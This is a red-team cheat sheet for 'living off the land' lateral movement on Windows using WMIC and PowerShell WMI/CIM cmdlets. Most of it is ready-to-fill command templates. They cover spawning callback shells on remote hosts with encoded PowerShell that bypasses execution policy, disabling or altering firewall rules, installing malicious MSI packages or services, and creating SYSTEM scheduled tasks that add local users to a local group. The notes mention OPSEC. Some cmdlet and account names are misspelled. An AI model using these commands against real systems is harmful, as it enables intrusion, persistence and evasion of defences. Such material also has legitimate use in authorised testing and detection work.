# Living off the Land

## 01 - Command Prompt

### 1.1 - Usage

TODO: Consult cybereason blog post to replicate the attacks (refer to the links)

- Execute a WMIC with commands remotely (You'll be relying on this a lot and it leaves a little footprint)

```
C:\> where /r C:\ wmic.exe

C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "<commands>"

C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] win32_process call create "C:\path\to\shell.exe"
```

### 1.2 - Use Cases

#### 1.2.1 - Spawn Callback Shells

```
C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "cmd.exe /c <commands>"

C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "C:\path\to\shell.exe"

C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "rundll32 C:\path\to\shell.dll"

C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "C:\Windows\System32\WindowsPowershell\v1.0\powershell -v 2 -enc <base64_encoded>"

C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -v 2 -enc <base64_encoded>"
```

#### 1.2.2 - Firewalls

- Disabling firewall rules (not recommended for OPSEC)

`C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "cmd.exe /c netsh advfirewall set allprofiles state off"`

- Deleting a firewall rule

`C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "cmd.exe /c netsh advfirewall firewall delete rule name=\"<rule_name>\""`

- Adding firewall rules

`C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "cmd.exe /c netsh advfirewall firewall add rule name=\"<rule_name>\" dir=in action=allow protocol=tcp localport=<port>"`

## 02 - Powershell

### 2.1 - Usage

#### 2.1.1 - Invoke-WmiMethod

```
PS C:\> Get-CimInstance -Classname Win32_Net* -List

PS C:\> Invoke-WmiMethod -Class Win32_NetConnection -ComputerName <IP> -Name RunPS -ArgumentList "<commands>"
```

#### 2.1.2 - Invoke-CimMethod

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
	CommandLine = "powershell.exe -noni -nop -ep bypass -E <base64_payload>"
}
```

### 2.2 - Use Cases

#### 2.2.1 - Spawn Callback Shells

##### 2.2.1.1 - Download Cradle

- `Invoke-WmiMethod`

```powershell
PS C:\> Invoke-WmiMethod -Class Win32_NetConnection -ComputerName <IP> -Name RunPS -ArgumentList "powershell -E <base64_encoded>"
```

```powershell
PS C:\> $servicetype = [byte] 16
$errorcontrol = [byte] 1
Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false, "Windows Performance", $errorcontrol, $null,$null,"WinPerf","c:\windows\system32\cmd.exe /c powershell -e <base64_encoded>",$null,$servicetype,"Manual","NT AUHORITY\SYSTEM","" -ComputerName <IP> -Credential <domain_name>\Administrator
```

- `Invoke-CimMethod`

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

$Command = "powershell.exe -noni -nop -ep bypass -E <base64_payload>"

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
	CommandLine = $Command
}
```

##### 2.2.1.2 - MSI Package

- `Invoke-CimMethod`

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
	PackageLocation = "C:\path\to\shell.msi";
	Options = "";
	AllUsers = $false
}
```

#### 2.2.2 - Create Service

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
	Name = "UpdateSVC";
	DisplayName = "UpdateSVC";
	Pathname = "C:\path\to\shellsvc.exe";
	ServiceType = [byte]::Parse("16"); # Win32OwnProcess
	StartMode = "<Manual | Auto>"
}

$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -Filter "Name LIKE 'UpdateSVC'"
```

- Start the service

`PS C:\> Invoke-CimMethod -InputObject $Service -MethodName StartService`

- Stop the service

`PS C:\> Invoke-CimMethod -InputObject $Service -MethodName StopService`

- Delete service

`PS C:\> Invoke-CimMethod -InputObject $Service -MethodName Delete`

#### 2.2.3 - Schedule Tasks

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

$Command = "cmd.exe"

$Args = "/c net user <username> <password> /add & net localgroup `"<local_group>`" <username> /add /y"

# Create new schedule task

$Action = New-ScheduleTaskAction -CimSession $Session -Execute $Command $Argument $Args

Register-ScheduleTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "<schedule_taskname>"

# Execute schedule task

Start-ScheduleTask -CimSession $Session -TaskName "<schedule_taskname>"

# Delete schedule task

Unregister-ScheduleTask -CimSession $Session -TaskName "<schedule_taskname>"
```

---
## References

- [Hacking Articles: Remote Services (Mitre:T1021)](https://www.hackingarticles.in/lateral-movement-remote-services-mitret1021/)

- [Mandiant: Windows Management Instrumentation](https://www.mandiant.com/sites/default/files/2021-09/wp-windows-management-instrumentation.pdf)

- [Cybereason: No Win32 Process Needed | Expanding the WMI Lateral Movement Arsenal](https://www.cybereason.com/blog/wmi-lateral-movement-win32)